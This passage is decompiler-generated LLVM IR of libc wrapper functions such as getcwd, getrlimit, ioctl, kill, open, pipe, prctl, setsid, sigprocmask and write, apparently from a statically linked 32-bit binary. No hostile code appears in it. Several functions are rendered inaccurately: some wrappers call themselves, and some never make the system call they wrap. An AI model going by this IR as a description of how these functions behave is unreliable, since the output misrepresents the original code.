dec_label_pc_12ed4:                               ; preds = %dec_label_pc_12ecc
  %v0_12ed4 = call i32 @__errno_location()
  %v0_12ed8 = load i32, i32* @r7, align 4
  store i32 %v0_12ed8, i32* @r5, align 4
  %v2_12ee0 = inttoptr i32 %v0_12ed4 to i32*
  store i32 22, i32* %v2_12ee0, align 4
  br label %dec_label_pc_12f8c

dec_label_pc_12ee8:                               ; preds = %dec_label_pc_12ecc
  %v0_12ee8 = call i32 @__GI_getpagesize()
  %v5_12ef0 = icmp slt i32 %v0_12ee8, 4096
  br i1 %v5_12ef0, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_12ee8
  store i32 %v0_12ee8, i32* @r4, align 4
  br label %dec_label_pc_12f0c

bb15:                                             ; preds = %dec_label_pc_12ee8
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_12f0c

dec_label_pc_12efc:                               ; preds = %entry
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_12ecc, label %dec_label_pc_12f0c, label %bb16

bb16:                                             ; preds = %dec_label_pc_12efc
  store i32 %arg1, i32* @r6, align 4
  br label %dec_label_pc_12f1c

dec_label_pc_12f0c:                               ; preds = %dec_label_pc_12efc, %bb, %bb15
  %v0_12f0c = phi i32 [ %v0_12ee8, %bb ], [ 4096, %bb15 ], [ %arg2, %dec_label_pc_12efc ]
  %v1_12f10 = call i32 @malloc(i32 %v0_12f0c)
  store i32 %v1_12f10, i32* @r6, align 4
  %v2_12f14 = icmp eq i32 %v1_12f10, 0
  br i1 %v2_12f14, label %dec_label_pc_12f88, label %dec_label_pc_12f0c.dec_label_pc_12f1c_crit_edge

dec_label_pc_12f0c.dec_label_pc_12f1c_crit_edge:  ; preds = %dec_label_pc_12f0c
  %v0_12f1c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12f1c

dec_label_pc_12f1c:                               ; preds = %bb16, %dec_label_pc_12f0c.dec_label_pc_12f1c_crit_edge
  %v0_12f20 = phi i32 [ %v1_12f10, %dec_label_pc_12f0c.dec_label_pc_12f1c_crit_edge ], [ %arg1, %bb16 ]
  %v0_12f1c = phi i32 [ %v0_12f1c.pre, %dec_label_pc_12f0c.dec_label_pc_12f1c_crit_edge ], [ %arg2, %bb16 ]
  %v2_12f24 = call i32 @getcwd(i32 %v0_12f20, i32 %v0_12f1c)
  store i32 %v2_12f24, i32* @r4, align 4
  %tmp = icmp ult i32 %v2_12f24, -4095
  br i1 %tmp, label %dec_label_pc_12f44, label %dec_label_pc_12f34

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12f1c
  %v0_12f34 = call i32 @__errno_location()
  %v0_12f38 = load i32, i32* @r4, align 4
  %v1_12f38 = sub i32 0, %v0_12f38
  %v2_12f3c = inttoptr i32 %v0_12f34 to i32*
  store i32 %v1_12f38, i32* %v2_12f3c, align 4
  br label %dec_label_pc_12f74

dec_label_pc_12f44:                               ; preds = %dec_label_pc_12f1c
  %v1_12f44 = icmp slt i32 %v2_12f24, 0
  br i1 %v1_12f44, label %dec_label_pc_12f74, label %dec_label_pc_12f4c

dec_label_pc_12f4c:                               ; preds = %dec_label_pc_12f44
  %v0_12f4c = load i32, i32* @r5, align 4
  %v2_12f4c = icmp eq i32 %v0_12f4c, 0
  br i1 %v2_12f4c, label %bb17, label %dec_label_pc_12f68.thread7

dec_label_pc_12f68.thread7:                       ; preds = %dec_label_pc_12f4c
  br label %dec_label_pc_12f8c

bb17:                                             ; preds = %dec_label_pc_12f4c
  %v1_12f50 = load i32, i32* @r7, align 4
  %v3_12f50 = icmp eq i32 %v1_12f50, 0
  br i1 %v3_12f50, label %dec_label_pc_12f68, label %dec_label_pc_12f68.thread

dec_label_pc_12f68.thread:                        ; preds = %bb17
  br label %bb18

dec_label_pc_12f68:                               ; preds = %bb17
  %v0_12f5c = load i32, i32* @r6, align 4
  %v2_12f60 = call i32 @realloc(i32 %v0_12f5c, i32 %v2_12f24)
  store i32 %v2_12f60, i32* @r5, align 4
  %v2_12f68 = icmp eq i32 %v2_12f60, 0
  br i1 %v2_12f68, label %bb18, label %dec_label_pc_12f8c

bb18:                                             ; preds = %dec_label_pc_12f68.thread, %dec_label_pc_12f68
  %v1_12f6c = load i32, i32* @r6, align 4
  store i32 %v1_12f6c, i32* @r5, align 4
  br label %dec_label_pc_12f8c

dec_label_pc_12f74:                               ; preds = %dec_label_pc_12f44, %dec_label_pc_12f34
  %v0_12f74 = load i32, i32* @r5, align 4
  %v2_12f74 = icmp eq i32 %v0_12f74, 0
  br i1 %v2_12f74, label %dec_label_pc_12f7c, label %dec_label_pc_12f88

dec_label_pc_12f7c:                               ; preds = %dec_label_pc_12f74
  %v0_12f7c = load i32, i32* @r6, align 4
  store i32 %v0_12f7c, i32* @r0, align 4
  %v0_12f80 = call i32 @free()
  br label %dec_label_pc_12f8c

dec_label_pc_12f88:                               ; preds = %dec_label_pc_12f74, %dec_label_pc_12f0c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12f8c

dec_label_pc_12f8c:                               ; preds = %dec_label_pc_12f68.thread7, %bb18, %dec_label_pc_12f68, %dec_label_pc_12f7c, %dec_label_pc_12ed4, %dec_label_pc_12f88
  %v0_12f8c = load i32, i32* @r5, align 4
  %v2_12f90 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12f90, i32* @r4, align 4
  store i32 %v6_12ebc, i32* @r5, align 4
  store i32 %v9_12ebc, i32* @r6, align 4
  store i32 %v12_12ebc, i32* @r7, align 4
  ret i32 %v0_12f8c

; uselistorder directives
  uselistorder i32 %v2_12f24, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12ee8, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_12f8c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_12f1c, { 1, 0 }
  uselistorder label %dec_label_pc_12f0c, { 0, 2, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_12f98 = ptrtoint i32* %stack_var_-12 to i32
  %v2_12fa4 = call i32 @getrlimit(i32 7, i32 %v2_12f98)
  %v1_12fa8 = icmp slt i32 %v2_12fa4, 0
  br i1 %v1_12fa8, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_12fb0 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_12fb8 = phi i32 [ 256, %entry ], [ %v5_12fb0, %bb ]
  ret i32 %v5_12fb8

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_12fc0 = load i32, i32* @global_var_2caa8.835, align 4
  %v2_12fc4 = icmp eq i32 %v2_12fc0, 0
  br i1 %v2_12fc4, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_12fcc = phi i32 [ %v2_12fc0, %entry ], [ 4096, %bb ]
  ret i32 %v1_12fcc

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12fd4 = load i32, i32* @r4, align 4
  store i32 %v3_12fd4, i32* %stack_var_-8, align 4
  %v0_12fd8 = call i32 @getpid()
  store i32 %v0_12fd8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fd8, -4095
  br i1 %tmp, label %dec_label_pc_12ff8, label %dec_label_pc_12fe8

dec_label_pc_12fe8:                               ; preds = %entry
  %v0_12fe8 = call i32 @__errno_location()
  %v0_12fec = load i32, i32* %r4.global-to-local, align 4
  %v1_12fec = sub i32 0, %v0_12fec
  %v2_12ff0 = inttoptr i32 %v0_12fe8 to i32*
  store i32 %v1_12fec, i32* %v2_12ff0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ff8

dec_label_pc_12ff8:                               ; preds = %entry, %dec_label_pc_12fe8
  %v0_12ff8 = phi i32 [ %v0_12fd8, %entry ], [ -1, %dec_label_pc_12fe8 ]
  %v2_12ffc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12ffc, i32* @r4, align 4
  ret i32 %v0_12ff8

; uselistorder directives
  uselistorder i32 %v0_12fd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ff8, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13000 = load i32, i32* @r4, align 4
  store i32 %v3_13000, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13024, label %dec_label_pc_13014

dec_label_pc_13014:                               ; preds = %entry
  %v0_13014 = call i32 @__errno_location()
  %v0_13018 = load i32, i32* %r4.global-to-local, align 4
  %v1_13018 = sub i32 0, %v0_13018
  %v2_1301c = inttoptr i32 %v0_13014 to i32*
  store i32 %v1_13018, i32* %v2_1301c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_13028.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13024

dec_label_pc_13024:                               ; preds = %entry, %dec_label_pc_13014
  %v2_13028 = phi i32 [ %v3_13000, %entry ], [ %v2_13028.pre, %dec_label_pc_13014 ]
  %v0_13024 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_13014 ]
  store i32 %v2_13028, i32* @r4, align 4
  ret i32 %v0_13024

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13024, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_13048 = load i32, i32* @r0, align 4
  %v3_13048 = call i32 @ioctl(i32 %v0_13048, i32 %arg1, i32 %arg2)
  store i32 %v3_13048, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_13048, -4095
  br i1 %tmp, label %dec_label_pc_13068, label %dec_label_pc_13058

dec_label_pc_13058:                               ; preds = %entry
  %v0_13058 = call i32 @__errno_location()
  %v0_1305c = load i32, i32* %r4.global-to-local, align 4
  %v1_1305c = sub i32 0, %v0_1305c
  %v2_13060 = inttoptr i32 %v0_13058 to i32*
  store i32 %v1_1305c, i32* %v2_13060, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13068

dec_label_pc_13068:                               ; preds = %entry, %dec_label_pc_13058
  %v0_13068 = phi i32 [ %v3_13048, %entry ], [ -1, %dec_label_pc_13058 ]
  ret i32 %v0_13068

; uselistorder directives
  uselistorder i32 %v3_13048, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13068, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1307c = load i32, i32* @r4, align 4
  store i32 %v3_1307c, i32* %stack_var_-8, align 4
  %v0_13080 = call i32 @kill()
  store i32 %v0_13080, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13080, -4095
  br i1 %tmp, label %dec_label_pc_130a0, label %dec_label_pc_13090

dec_label_pc_13090:                               ; preds = %entry
  %v0_13090 = call i32 @__errno_location()
  %v0_13094 = load i32, i32* %r4.global-to-local, align 4
  %v1_13094 = sub i32 0, %v0_13094
  %v2_13098 = inttoptr i32 %v0_13090 to i32*
  store i32 %v1_13094, i32* %v2_13098, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_130a0

dec_label_pc_130a0:                               ; preds = %entry, %dec_label_pc_13090
  %v0_130a0 = phi i32 [ %v0_13080, %entry ], [ -1, %dec_label_pc_13090 ]
  %v2_130a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_130a4, i32* @r4, align 4
  ret i32 %v0_130a0

; uselistorder directives
  uselistorder i32 %v0_13080, { 1, 0, 2 }
  uselistorder label %dec_label_pc_130a0, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_130b8 = and i32 %arg2, 64
  %v2_130b8 = icmp eq i32 %v1_130b8, 0
  br i1 %v2_130b8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_130a8 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_130a8, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_130c8 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_130c8, i32* @r2, align 4
  %v4_130d0 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_130d4 = icmp eq i32 %v4_130d0, -4096
  store i1 %v7_130d4, i1* @cpsr_z, align 1
  store i32 %v4_130d0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_130d0, -4095
  br i1 %tmp, label %dec_label_pc_130f0, label %dec_label_pc_130e0

dec_label_pc_130e0:                               ; preds = %.thread1
  %v0_130e0 = call i32 @__errno_location()
  %v0_130e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_130e4 = sub i32 0, %v0_130e4
  %v2_130e8 = inttoptr i32 %v0_130e0 to i32*
  store i32 %v1_130e4, i32* %v2_130e8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_130f0

dec_label_pc_130f0:                               ; preds = %.thread1, %dec_label_pc_130e0
  %v0_130f0 = phi i32 [ %v4_130d0, %.thread1 ], [ -1, %dec_label_pc_130e0 ]
  ret i32 %v0_130f0

; uselistorder directives
  uselistorder i32 %v4_130d0, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_130f0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_1310c = load i32, i32* @r0, align 4
  %v2_1310c = inttoptr i32 %v0_1310c to i8*
  %v3_1310c = call i32 @__libc_open(i8* %v2_1310c, i32 577)
  %v0_13110 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13110, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_13110 = and i32 %v3_1310c, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_13110 = phi i32 [ %v3_1310c, %entry ], [ %v6_13110, %bb ]
  ret i32 %v7_13110

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13114 = load i32, i32* @r4, align 4
  store i32 %v3_13114, i32* %stack_var_-8, align 4
  %v1_13118 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_13118 = call i32 @pipe([2 x i32] %v1_13118)
  store i32 %v2_13118, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_13118, -4095
  br i1 %tmp, label %dec_label_pc_13138, label %dec_label_pc_13128

dec_label_pc_13128:                               ; preds = %entry
  %v0_13128 = call i32 @__errno_location()
  %v0_1312c = load i32, i32* %r4.global-to-local, align 4
  %v1_1312c = sub i32 0, %v0_1312c
  %v2_13130 = inttoptr i32 %v0_13128 to i32*
  store i32 %v1_1312c, i32* %v2_13130, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13138

dec_label_pc_13138:                               ; preds = %entry, %dec_label_pc_13128
  %v0_13138 = phi i32 [ %v2_13118, %entry ], [ -1, %dec_label_pc_13128 ]
  %v2_1313c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1313c, i32* @r4, align 4
  ret i32 %v0_13138

; uselistorder directives
  uselistorder i32 %v2_13118, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13138, { 1, 0 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13140 = load i32, i32* @r4, align 4
  store i32 %v3_13140, i32* %stack_var_-8, align 4
  %v0_13148 = call i32 @prctl()
  store i32 %v0_13148, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13148, -4095
  br i1 %tmp, label %dec_label_pc_13168, label %dec_label_pc_13158

dec_label_pc_13158:                               ; preds = %entry
  %v0_13158 = call i32 @__errno_location()
  %v0_1315c = load i32, i32* %r4.global-to-local, align 4
  %v1_1315c = sub i32 0, %v0_1315c
  %v2_13160 = inttoptr i32 %v0_13158 to i32*
  store i32 %v1_1315c, i32* %v2_13160, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13168

dec_label_pc_13168:                               ; preds = %entry, %dec_label_pc_13158
  %v0_13168 = phi i32 [ %v0_13148, %entry ], [ -1, %dec_label_pc_13158 ]
  %v2_1316c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1316c, i32* @r4, align 4
  ret i32 %v0_13168

; uselistorder directives
  uselistorder i32 %v0_13148, { 1, 0, 2 }
  uselistorder i32 ()* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_13168, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13170 = load i32, i32* @r4, align 4
  store i32 %v3_13170, i32* %stack_var_-8, align 4
  %v1_13174 = load i32, i32* @r1, align 4
  %v2_13174 = inttoptr i32 %v1_13174 to i32*
  %v3_13174 = load i32, i32* @r2, align 4
  %v4_13174 = call i32 @read(i32 %arg1, i32* %v2_13174, i32 %v3_13174)
  store i32 %v4_13174, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_13174, -4095
  br i1 %tmp, label %dec_label_pc_13194, label %dec_label_pc_13184

dec_label_pc_13184:                               ; preds = %entry
  %v0_13184 = call i32 @__errno_location()
  %v0_13188 = load i32, i32* %r4.global-to-local, align 4
  %v1_13188 = sub i32 0, %v0_13188
  %v2_1318c = inttoptr i32 %v0_13184 to i32*
  store i32 %v1_13188, i32* %v2_1318c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13194

dec_label_pc_13194:                               ; preds = %entry, %dec_label_pc_13184
  %v0_13194 = phi i32 [ %v4_13174, %entry ], [ -1, %dec_label_pc_13184 ]
  %v2_13198 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13198, i32* @r4, align 4
  ret i32 %v0_13194

; uselistorder directives
  uselistorder i32 %v4_13174, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13194, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1319c = load i32, i32* @r4, align 4
  store i32 %v3_1319c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_131c4, label %dec_label_pc_131b4

dec_label_pc_131b4:                               ; preds = %entry
  %v0_131b4 = call i32 @__errno_location()
  %v0_131b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_131b8 = sub i32 0, %v0_131b8
  %v2_131bc = inttoptr i32 %v0_131b4 to i32*
  store i32 %v1_131b8, i32* %v2_131bc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_131c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_131c4

dec_label_pc_131c4:                               ; preds = %entry, %dec_label_pc_131b4
  %v2_131c8 = phi i32 [ %v3_1319c, %entry ], [ %v2_131c8.pre, %dec_label_pc_131b4 ]
  %v0_131c4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_131b4 ]
  store i32 %v2_131c8, i32* @r4, align 4
  ret i32 %v0_131c4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_131c4, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_131cc = load i32, i32* @r4, align 4
  store i32 %v3_131cc, i32* %stack_var_-8, align 4
  %v0_131d0 = call i32 @setsid()
  store i32 %v0_131d0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_131d0, -4095
  br i1 %tmp, label %dec_label_pc_131f0, label %dec_label_pc_131e0

dec_label_pc_131e0:                               ; preds = %entry
  %v0_131e0 = call i32 @__errno_location()
  %v0_131e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_131e4 = sub i32 0, %v0_131e4
  %v2_131e8 = inttoptr i32 %v0_131e0 to i32*
  store i32 %v1_131e4, i32* %v2_131e8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_131f0

dec_label_pc_131f0:                               ; preds = %entry, %dec_label_pc_131e0
  %v0_131f0 = phi i32 [ %v0_131d0, %entry ], [ -1, %dec_label_pc_131e0 ]
  %v2_131f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_131f4, i32* @r4, align 4
  ret i32 %v0_131f0

; uselistorder directives
  uselistorder i32 %v0_131d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_131f0, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_131f8 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_131f8, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_132005 = load i32, i32* @r4, align 4
  store i32 %v3_132005, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13220

bb:                                               ; preds = %entry
  %v3_13200 = load i32, i32* @r4, align 4
  store i32 %v3_13200, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_13220, label %dec_label_pc_1320c

dec_label_pc_1320c:                               ; preds = %bb
  %v0_1320c = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13218 = inttoptr i32 %v0_1320c to i32*
  store i32 22, i32* %v2_13218, align 4
  %v0_13244.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13244

dec_label_pc_13220:                               ; preds = %.thread, %bb
  %v7_13220 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_13220, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_13220, -4095
  br i1 %tmp13, label %dec_label_pc_13240, label %dec_label_pc_13230

dec_label_pc_13230:                               ; preds = %dec_label_pc_13220
  %v0_13230 = call i32 @__errno_location()
  %v0_13234 = load i32, i32* %r4.global-to-local, align 4
  %v1_13234 = sub i32 0, %v0_13234
  %v2_13238 = inttoptr i32 %v0_13230 to i32*
  store i32 %v1_13234, i32* %v2_13238, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13240

dec_label_pc_13240:                               ; preds = %dec_label_pc_13220, %dec_label_pc_13230
  %v0_13240 = phi i32 [ %v7_13220, %dec_label_pc_13220 ], [ -1, %dec_label_pc_13230 ]
  store i32 %v0_13240, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13244

dec_label_pc_13244:                               ; preds = %dec_label_pc_1320c, %dec_label_pc_13240
  %v0_13244 = phi i32 [ %v0_13244.pre, %dec_label_pc_1320c ], [ %v0_13240, %dec_label_pc_13240 ]
  %v2_13248 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13248, i32* @r4, align 4
  ret i32 %v0_13244

; uselistorder directives
  uselistorder i32 %v7_13220, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_13244, { 1, 0 }
  uselistorder label %dec_label_pc_13240, { 1, 0 }
  uselistorder label %dec_label_pc_13220, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1324c = load i32, i32* @r4, align 4
  store i32 %v3_1324c, i32* %stack_var_-8, align 4
  %v2_13250 = call i32 @time(i32* %arg1)
  store i32 %v2_13250, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_13250, -4095
  br i1 %tmp, label %dec_label_pc_13270, label %dec_label_pc_13260

dec_label_pc_13260:                               ; preds = %entry
  %v0_13260 = call i32 @__errno_location()
  %v0_13264 = load i32, i32* %r4.global-to-local, align 4
  %v1_13264 = sub i32 0, %v0_13264
  %v2_13268 = inttoptr i32 %v0_13260 to i32*
  store i32 %v1_13264, i32* %v2_13268, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13270

dec_label_pc_13270:                               ; preds = %entry, %dec_label_pc_13260
  %v0_13270 = phi i32 [ %v2_13250, %entry ], [ -1, %dec_label_pc_13260 ]
  %v2_13274 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13274, i32* @r4, align 4
  ret i32 %v0_13270

; uselistorder directives
  uselistorder i32 %v2_13250, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13270, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_1327c = call i32 @wait4()
  ret i32 %v0_1327c
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13280 = load i32, i32* @r4, align 4
  store i32 %v3_13280, i32* %stack_var_-8, align 4
  %v3_13284 = load i32, i32* @r2, align 4
  %v4_13284 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_13284)
  store i32 %v4_13284, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_13284, -4095
  br i1 %tmp, label %dec_label_pc_132a4, label %dec_label_pc_13294

dec_label_pc_13294:                               ; preds = %entry
  %v0_13294 = call i32 @__errno_location()
  %v0_13298 = load i32, i32* %r4.global-to-local, align 4
  %v1_13298 = sub i32 0, %v0_13298
  %v2_1329c = inttoptr i32 %v0_13294 to i32*
  store i32 %v1_13298, i32* %v2_1329c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_132a4

dec_label_pc_132a4:                               ; preds = %entry, %dec_label_pc_13294
  %v0_132a4 = phi i32 [ %v4_13284, %entry ], [ -1, %dec_label_pc_13294 ]
  %v2_132a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_132a8, i32* @r4, align 4
  ret i32 %v0_132a4

; uselistorder directives
  uselistorder i32 %v4_13284, { 1, 0, 2 }
  uselistorder label %dec_label_pc_132a4, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v2_132b0 = load i32, i32* @global_var_264e8, align 4
  %v3_132b4 = mul i32 %arg1, 2
  %v4_132b4 = add i32 %v2_132b0, %v3_132b4
  %v5_132b4 = inttoptr i32 %v4_132b4 to i8*
  %v6_132b4 = load i8, i8* %v5_132b4, align 1
  %v8_132b4 = zext i8 %v6_132b4 to i32
  %v1_132b8 = and i32 %v8_132b4, 32
  ret i32 %v1_132b8
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_132cc = icmp slt i32 %arg1, 0
  br i1 %v1_132cc, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_132cc = mul i32 %arg1, 2
  %v2_132d8 = load i32, i32* @global_var_264f0, align 4
  %v2_132dc = add i32 %v2_132d8, %v2_132cc
  %v3_132e0 = inttoptr i32 %v2_132dc to i8*
  %v4_132e0 = load i8, i8* %v3_132e0, align 1
  %v6_132e0 = zext i8 %v4_132e0 to i32
  %v1_132e4 = add i32 %v2_132dc, 1
  %v2_132e4 = inttoptr i32 %v1_132e4 to i8*
  %v3_132e4 = load i8, i8* %v2_132e4, align 1
  %v4_132e4 = zext i8 %v3_132e4 to i32
  %v3_132e8 = mul nuw i32 %v4_132e4, 16777216
  %v4_132ec = sdiv i32 %v3_132e8, 65536
  %v5_132ec = or i32 %v4_132ec, %v6_132e0
  ret i32 %v5_132ec

; uselistorder directives
  uselistorder i32 %v2_132dc, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2cab8.845 to i32)
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
